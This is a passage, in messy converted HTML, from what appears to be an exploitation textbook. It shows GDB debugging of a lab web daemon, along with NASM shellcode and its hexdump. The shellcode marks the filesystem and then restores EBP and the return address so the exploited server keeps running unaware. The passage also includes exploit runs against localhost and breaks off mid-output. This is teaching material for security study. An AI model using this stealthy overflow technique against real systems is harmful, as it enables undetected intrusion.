style="padding-top: 5pt;padding-left: 2pt;text-indent: 0pt;text-align: left;">trimmed ]:.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;handle_connection+841&gt;:</p></td><td style="width:36pt"><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">call</p></td><td style="width:113pt"><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s42" style="padding-left: 4pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0x8048850 &lt;write@plt&gt;</p></td></tr></table><table style="border-collapse:collapse;margin-left:19.44pt" cellspacing="0"><tr style="height:42pt"><td style="width:159pt"><p class="s42" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0x08049307 &lt;handle_connection+846&gt;:</p><p class="s42" style="text-indent: 0pt;line-height: 107%;text-align: left;">0x0804930f &lt;handle_connection+854&gt;: 0x08049312 &lt;handle_connection+857&gt;:</p><p class="s42" style="text-indent: 0pt;line-height: 10pt;text-align: left;">0x08049315 &lt;handle_connection+860&gt;:</p></td><td style="width:34pt"><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 9pt;text-align: left;">mov</p><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov mov</p><p class="s42" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">call</p></td><td style="width:212pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">DWORD PTR [esp+4],0x2</p><p class="s42" style="padding-left: 6pt;padding-right: 90pt;text-indent: 0pt;line-height: 107%;text-align: left;">eax,DWORD PTR [ebp+8] DWORD PTR [esp],eax</p><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x8048800 &lt;shutdown@plt&gt;</p></td></tr><tr style="height:11pt"><td style="width:159pt"><p class="s45" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0x0804931a &lt;handle_connection+865&gt;:</p></td><td style="width:34pt"><p class="s45" style="padding-left: 9pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">add</p></td><td style="width:212pt"><p class="s45" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">esp,0x644</p></td></tr><tr style="height:11pt"><td style="width:159pt"><p class="s45" style="text-indent: 0pt;line-height: 9pt;text-align: left;">0x08049320 &lt;handle_connection+871&gt;:</p></td><td style="width:34pt"><p class="s45" style="padding-left: 9pt;padding-right: 9pt;text-indent: 0pt;line-height: 9pt;text-align: center;">pop</p></td><td style="width:212pt"><p class="s45" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ebx</p></td></tr><tr style="height:22pt"><td style="width:159pt"><p class="s45" style="text-indent: 0pt;line-height: 10pt;text-align: left;">0x08049321 &lt;handle_connection+872&gt;:</p><p class="s45" style="text-indent: 0pt;line-height: 10pt;text-align: left;">0x08049322 &lt;handle_connection+873&gt;:</p></td><td style="width:34pt"><p class="s45" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">pop</p><p class="s45" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ret</p></td><td style="width:212pt"><p class="s45" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ebp</p></td></tr><tr style="height:24pt"><td style="width:159pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s42" style="padding-right: 49pt;text-indent: 0pt;text-align: left;">End of assembler dump. (gdb)</p></td><td style="width:34pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:212pt;border-bottom-style:solid;border-bottom-width:1pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-top: 4pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">At the beginning of the function, the function prologue saves the current values of the EBP and EBX registers by pushing them to the stack, and sets EBP to the current value of ESP so it can be used as a point of reference for accessing stack variables. Finally, <span class="s31">0x644 </span>bytes are saved on the stack for these stack variables by subtracting from ESP. The function epilogue at the end restores ESP by adding <span class="s31">0x644 </span>back to it and restores the saved values of EBX and EBP by popping them from the stack back into the registers.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The overwrite instructions are actually found in the <span class="s31">recv_line() </span>func- tion; however, they write to data in the <span class="s31">handle_connection() </span>stack frame, so the overwrite itself happens in <span class="s31">handle_connection()</span>. The return address that we overwrite is pushed to the stack when <span class="s31">handle_connection() </span>is called, so the saved values for EBP and EBX pushed to the stack in the function prologue will be between the return address and the corruptible buffer. This means that EBP and EBX will get mangled when the function epilogue executes. Since we don’t gain control of the program’s execution until the return instruction, all the instructions between the overwrite and the return instruc- tion must be executed. First, we need to assess how much collateral damage is done by these extra instructions after the overwrite. The assembly instruct- ion <span class="s31">int3 </span>creates the byte <span class="s31">0xcc</span>, which is literally a debugging breakpoint.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">The shellcode below uses an <span class="s31">int3 </span>instruction instead of exiting. This break- point will be caught by GDB, allowing us to examine the exact state of the program after the shellcode executes.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">mark_break.s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1042.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">BITS 32</p><p class="s31" style="padding-left: 104pt;text-indent: -12pt;line-height: 107%;text-align: left;">; Mark the filesystem to prove you ran. jmp short one</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">two:</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">pop ebx      ; Filename xor ecx, ecx</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov BYTE [ebx+7], cl ; Null terminate filename push BYTE 0x5    ; Open()</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">pop eax</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">mov WORD cx, 0x441  ; O_WRONLY|O_APPEND|O_CREAT</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">xor edx, edx</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">mov WORD dx, 0x180  ; S_IRUSR|S_IWUSR</p><p class="s31" style="padding-left: 63pt;text-indent: 0pt;text-align: center;">int 0x80       ; Open file to create it.</p><p class="s31" style="padding-left: 29pt;text-indent: 0pt;text-align: center;">; eax = returned file descriptor</p><p class="s31" style="padding-left: 3pt;text-indent: 0pt;text-align: center;">mov ebx, eax    ; File descriptor to second arg</p><p class="s31" style="padding-top: 2pt;padding-left: 104pt;text-indent: 0pt;text-align: left;">push BYTE 0x6    ; Close () pop eax</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">int 0x80 ; Close file.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 12pt;text-align: left;">int3  ; zinterrupt one:</p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 12pt;line-height: 107%;text-align: left;">call two db &quot;/HackedX&quot;</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1043.png"/></span></p><p style="padding-top: 7pt;padding-left: 109pt;text-indent: 0pt;text-align: left;">To use this shellcode, first get GDB set up to debug the tinyweb daemon.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">In the output below, a breakpoint is set right before <span class="s31">handle_connection() </span>is called. The goal is to restore the mangled registers to their original state found at this breakpoint.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1044.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./tinywebd Starting tiny web daemon.</p><p class="s31" style="padding-bottom: 1pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ps aux | grep tinywebd</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:34pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">root</p></td><td style="width:77pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">23497 0.0 0.0</p></td><td style="width:30pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">1636</p></td><td style="width:53pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">356 ?</p></td><td style="width:23pt"><p class="s42" style="padding-left: 7pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">Ss</p></td><td style="width:34pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">17:08</p></td><td style="width:85pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0:00 ./tinywebd</p></td></tr><tr style="height:10pt"><td style="width:34pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">reader</p></td><td style="width:77pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">23506 0.0 0.0</p></td><td style="width:30pt"><p class="s42" style="padding-right: 6pt;text-indent: 0pt;line-height: 9pt;text-align: right;">2880</p></td><td style="width:53pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">748 pts/1</p></td><td style="width:23pt"><p class="s42" style="padding-left: 7pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">R+</p></td><td style="width:34pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">17:09</p></td><td style="width:85pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0:00 grep tinywebd</p></td></tr></table><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -g tinywebd.c reader@hacking:~/booksrc $ sudo gdb -q -pid=23497 --symbols=./a.out</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">warning: not using untrusted file &quot;/home/reader/.gdbinit&quot;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Using host libthread_db library &quot;/lib/tls/i686/cmov/libthread_db.so.1&quot;. Attaching to process 23497</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">/cow/home/reader/booksrc/tinywebd: No such file or directory. A program is being debugged already. Kill it? (y or n) n Program not killed.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) set dis intel (gdb) x/5i main+533</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">0x8048fa8 &lt;main+533&gt;:  mov  DWORD PTR [esp+4],eax 0x8048fac &lt;main+537&gt;:  mov  eax,DWORD PTR [ebp-12] 0x8048faf &lt;main+540&gt;:  mov  DWORD PTR [esp],eax <b>0x8048fb2 &lt;main+543&gt;:  call  0x8048fb9 &lt;handle_connection&gt; </b>0x8048fb7 &lt;main+548&gt;:  jmp  0x8048f65 &lt;main+466&gt;</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) break *0x8048fb2</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1 at 0x8048fb2: file tinywebd.c, line 72. (gdb) cont</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">Continuing.</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1045.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">In the output above, a breakpoint is set right before <span class="s31">handle_connection() </span>is called (shown in bold). Then, in another terminal window, the exploit tool is used to throw the new shellcode at it. This will advance execution to the break- point in the other terminal.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1046.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ nasm mark_break.s reader@hacking:~/booksrc $ ./xtool_tinywebd.sh mark_break 127.0.0.1 target IP: 127.0.0.1</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">shellcode: mark_break (44 bytes)</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">[NOP (372 bytes)] [shellcode (44 bytes)] [ret addr (128 bytes)] localhost [127.0.0.1] 80 (www) open</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1047.png"/></span></p><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">Back in the debugging terminal, the first breakpoint is encountered. Some important stack registers are displayed, which show the stack setup before (and after) the <span class="s31">handle_connection() </span>call. Then, execution continues to the <span class="s31">int3 </span>instruction in the shellcode, which acts like a breakpoint. Then these stack registers are checked again to view their state at the moment the shellcode begins to execute.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1048.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">Breakpoint 1, 0x08048fb2 in main () at tinywebd.c:72</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">72     handle_connection(new_sockfd, &amp;client_addr, logfd); (gdb) i r esp ebx ebp</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">esp</p></td><td style="width:66pt"><p class="s42" style="padding-left: 8pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7e0</p></td><td style="width:64pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xbffff7e0</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ebx</p></td><td style="width:66pt"><p class="s42" style="padding-left: 8pt;text-indent: 0pt;line-height: 9pt;text-align: left;">0xb7fd5ff4</p></td><td style="width:64pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 9pt;text-align: left;">-1208131596</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ebp</p></td><td style="width:66pt"><p class="s42" style="padding-left: 8pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff848</p></td><td style="width:64pt"><p class="s42" style="padding-left: 14pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0xbffff848</p></td></tr><tr style="height:11pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">(gdb) cont</p></td><td style="width:66pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:64pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr><tr style="height:10pt"><td style="width:58pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">Continuing.</p></td><td style="width:66pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td><td style="width:64pt"><p style="text-indent: 0pt;text-align: left;"><br/></p></td></tr></table><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">Program received signal SIGTRAP, Trace/breakpoint trap. 0xbffff753 in ?? ()</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">(gdb) i r esp ebx ebp</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">esp      0xbffff7e0    0xbffff7e0</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">ebx      0x6   6</p><p style="text-indent: 0pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1049.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">ebp      0xbffff624    0xbffff624 (gdb)</p><p style="padding-top: 11pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">This output shows that EBX and EBP are changed at the point the shell- code begins execution. However, an inspection of the instructions in <span class="s31">main()</span>’s disassembly shows that EBX isn’t actually used. The compiler probably saved this register to the stack due to some rule about calling convention, even though it isn’t really used. EBP, however, is used heavily, since it’s the point of reference for all local stack variables. Because the original saved value of EBP was overwritten by our exploit, the original value must be recreated.</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">When EBP is restored to its original value, the shellcode should be able to do its dirty work and then return back into <span class="s31">main() </span>as usual. Since com- puters are deterministic, the assembly instructions will clearly explain how to do all this.</p><p style="text-indent: 0pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1050.png"/></span></p><p class="s31" style="padding-top: 12pt;padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">(gdb) set dis intel (gdb) x/5i main</p><table style="border-collapse:collapse;margin-left:16.94pt" cellspacing="0"><tr style="height:10pt"><td style="width:43pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x8048d93</p></td><td style="width:55pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 4pt;padding-right: 4pt;text-indent: 0pt;line-height: 9pt;text-align: center;">push</p></td><td style="width:280pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">ebp</p></td></tr><tr style="height:11pt"><td style="width:43pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x8048d94</p></td><td style="width:55pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+1&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 10pt;text-align: center;">mov</p></td><td style="width:280pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">ebp,esp</p></td></tr><tr style="height:11pt"><td style="width:43pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x8048d96</p></td><td style="width:55pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+3&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 10pt;text-align: center;">sub</p></td><td style="width:280pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">esp,0x68</p></td></tr><tr style="height:11pt"><td style="width:43pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x8048d99</p></td><td style="width:55pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main+6&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">and</p></td><td style="width:280pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">esp,0xfffffff0</p></td></tr><tr style="height:10pt"><td style="width:43pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x8048d9c</p></td><td style="width:55pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main+9&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">mov</p></td><td style="width:280pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">eax,0x0</p></td></tr><tr style="height:11pt"><td style="width:408pt" colspan="4"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">(gdb) x/5i main+533</p></td></tr><tr style="height:12pt"><td style="width:43pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x8048fa8</p></td><td style="width:55pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+533&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 10pt;text-align: center;">mov</p></td><td style="width:280pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">DWORD PTR [esp+4],eax</p></td></tr><tr style="height:11pt"><td style="width:43pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x8048fac</p></td><td style="width:55pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main+537&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">mov</p></td><td style="width:280pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">eax,DWORD PTR [ebp-12]</p></td></tr><tr style="height:11pt"><td style="width:43pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 9pt;text-align: center;">0x8048faf</p></td><td style="width:55pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 9pt;text-align: left;">&lt;main+540&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 9pt;text-align: center;">mov</p></td><td style="width:280pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 9pt;text-align: left;">DWORD PTR [esp],eax</p></td></tr><tr style="height:11pt"><td style="width:43pt"><p class="s42" style="padding-left: 1pt;text-indent: 0pt;line-height: 10pt;text-align: center;">0x8048fb2</p></td><td style="width:55pt"><p class="s42" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+543&gt;:</p></td><td style="width:30pt"><p class="s42" style="padding-left: 4pt;padding-right: 4pt;text-indent: 0pt;line-height: 10pt;text-align: center;">call</p></td><td style="width:280pt"><p class="s42" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x8048fb9 &lt;handle_connection&gt;</p></td></tr><tr style="height:24pt"><td style="width:43pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x8048fb7</p><p class="s42" style="padding-left: 2pt;text-indent: 0pt;text-align: left;">(gdb)</p></td><td style="width:55pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s45" style="padding-left: 2pt;text-indent: 0pt;line-height: 10pt;text-align: left;">&lt;main+548&gt;:</p></td><td style="width:30pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s45" style="padding-left: 1pt;padding-right: 5pt;text-indent: 0pt;line-height: 10pt;text-align: center;">jmp</p></td><td style="width:280pt;border-bottom-style:solid;border-bottom-width:1pt"><p class="s45" style="padding-left: 6pt;text-indent: 0pt;line-height: 10pt;text-align: left;">0x8048f65 &lt;main+466&gt;</p></td></tr></table><p style="padding-top: 3pt;padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">A quick glance at the function prologue for <span class="s31">main() </span>shows that EBP should be <span class="s31">0x68 </span>bytes larger than ESP. Since ESP wasn’t damaged by our exploit, we can restore the value for EBP by adding <span class="s31">0x68 </span>to ESP at the end of our shell- code. With EBP restored to the proper value, the program execution can be safely returned into the connection-accepting loop. The proper return address for the <span class="s31">handle_connection() </span>call is the instruction found after the call</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 11pt;text-align: left;">at <span class="s31">0x08048fb7</span>. The following shellcode uses this technique.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s40" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">mark_restore.s</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1051.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">BITS 32</p><p class="s31" style="padding-left: 104pt;text-indent: -12pt;line-height: 107%;text-align: left;">; Mark the filesystem to prove you ran. jmp short one</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">two:</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">pop ebx      ; Filename xor ecx, ecx</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov BYTE [ebx+7], cl ; Null terminate filename push BYTE 0x5    ; Open()</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 10pt;text-align: left;">pop eax</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">mov WORD cx, 0x441  ; O_WRONLY|O_APPEND|O_CREAT</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">xor edx, edx</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">mov WORD dx, 0x180  ; S_IRUSR|S_IWUSR</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">int 0x80       ; Open file to create it.</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;text-align: left;">; eax = returned file descriptor</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">mov ebx, eax     ; File descriptor to second arg push BYTE 0x6    ; Close ()</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 10pt;text-align: left;">pop eax</p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;text-align: left;">int 0x80 ; close file</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 106%;text-align: left;">lea ebp, [esp+0x68] ; Restore EBP. push 0x08048fb7   ; Return address. ret        ; Return</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">one:</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 12pt;text-align: left;">call two db &quot;/HackedX&quot;</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_1052.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">When assembled and used in an exploit, this shellcode will restore the tinyweb daemon’s execution after marking the filesystem. The tinyweb daemon doesn’t even know that something happened.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_1053.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ nasm mark_restore.s reader@hacking:~/booksrc $ hexdump -C mark_restore</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000000 eb 26 5b 31 c9 88 4b 07 6a 05 58 66 b9 41 04 31 |.&amp;[1.K.j.Xf.A.1|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000010 d2 66 ba 80 01 cd 80 89 c3 6a 06 58 cd 80 8d 6c |.f.  j.X..l|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000020 24 68 68 b7 8f 04 08 c3 e8 d5 ff ff ff 2f 48 61 |$hh   /Ha|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000030 63 6b 65 64 58                  |ckedX|</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">00000035</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 106%;text-align: left;">reader@hacking:~/booksrc $ sudo rm /Hacked reader@hacking:~/booksrc $ ./tinywebd Starting tiny web daemon.</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ ./xtool_tinywebd_steath.sh mark_restore 127.0.0.1 target IP: 127.0.0.1</p><p class="s31" style="padding-top: 2pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">shellcode: mark_restore (53 bytes)</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">fake request: &quot;GET / HTTP/1.1\x00&quot; (15 bytes)</p><p class="s31" style="padding-left: 19pt;text-indent: 